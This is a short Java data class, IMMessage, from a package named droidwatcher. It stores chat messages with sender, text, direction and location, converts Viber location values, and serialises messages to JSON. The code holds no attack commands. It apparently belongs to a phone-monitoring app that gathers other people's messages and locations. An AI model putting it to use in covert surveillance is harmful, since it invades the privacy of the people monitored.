package com.droidwatcher.lib;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import org.json.JSONException;
import org.json.JSONObject;

public class IMMessage implements IMessageBody {	
	public long date;
	public String name;
	public String text;
	public Integer type;
	
	public double lat;
	public double lon;
	
	/**
	 * 
	 * @param date - message date
	 * @param text - message text
	 * @param name - user name
	 * @param type - message direction (1-in; 2-out)
	 */
	public IMMessage(long date, String text, String name, Integer type){
		this.text = text;
		this.date = date;
		this.name = name;
		this.type = type;
	}
	
	public IMMessage addLocation(double lat, double lon){
		this.lat = lat;
		this.lon = lon;
		return this;
	}
	
	/** Viber format convertation long -> double */
	public IMMessage addLocationViber(Long lat, Long lon){
		return this.addLocation(lat.doubleValue() / 10000000, lon.doubleValue() / 10000000);
	}

	public JSONObject getJSONObject() {
		JSONObject obj = new JSONObject();
		try {
			obj.put("name", name);
			obj.put("date", date);
			obj.put("text", text);
			obj.put("type", type);
			
			if (lat != 0 && lon != 0) {
				obj.put("lat", lat);
				obj.put("lon", lon);
			}
			
		} catch (JSONException e) {
			e.printStackTrace();
		}
		return obj;
	}
	
	public String getStringDate(){
		return SimpleDateFormat.getDateTimeInstance(SimpleDateFormat.SHORT, SimpleDateFormat.SHORT, new Locale("ru","RU")).format(new Date(date));
	}
	
}
